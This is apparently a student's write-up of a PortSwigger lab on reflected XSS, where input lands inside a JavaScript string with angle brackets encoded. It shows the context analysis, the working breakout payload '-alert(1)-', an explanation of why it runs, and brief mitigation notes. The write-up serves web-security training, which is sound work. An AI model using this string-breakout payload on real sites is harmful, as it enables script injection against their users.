# Lab19 - Reflected XSS Into A JavaScript String With Angle Brackets HTML Encoded

## Objective

Exploit reflected XSS where:

```html
<
>
```

are encoded but input is reflected inside JavaScript.

Execute:

```javascript
alert(1)
```

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | Reflected XSS |
| Difficulty | Practitioner |
| Context | JavaScript String |
| Platform | PortSwigger |

---

# Vulnerability Overview

The application reflects input inside:

```javascript
var searchTerms = 'USER_INPUT';
```

while encoding:

```html
<
>
```

---

# Analysis

## Step 1

Search:

```text
carry123
```

---

## Step 2

Inspect source.

Observed:

```javascript
var searchTerms='carry123';
```

---

## Step 3

Determine Context

```text
JavaScript String
```

---

## Step 4

Need String Breakout

Goal:

```text
Terminate String
        ↓
Execute JavaScript
        ↓
Repair Script
```

---

# Full Payload(s) Used

```javascript
'-alert(1)-'
```

---

# Why The Payload Works

Original:

```javascript
var searchTerms='USER_INPUT';
```

---

Injected:

```javascript
var searchTerms=''
-alert(1)
-'';
```

---

Execution Flow

```text
String Ends
        ↓
alert(1)
        ↓
Execution
```

---

# Personal Analysis & Testing Process

## Key Observation

Cannot use:

```html
</script>
```

because:

```html
<
>
```

encoded.

---

## Strategy

Exploit JavaScript directly.

---

## Payload Selection

```javascript
'-alert(1)-'
```

---

## Result

```javascript
alert(1)
```

executed.

Lab solved.

---

# Mitigation

Escape user input for JavaScript context.

Use JSON encoding.

---

# Related Theory

- 27-breaking-out-of-a-javascript-string.md

---

# Key Learnings

- Context determines bypass strategy.
- JavaScript execution often doesn't require HTML injection.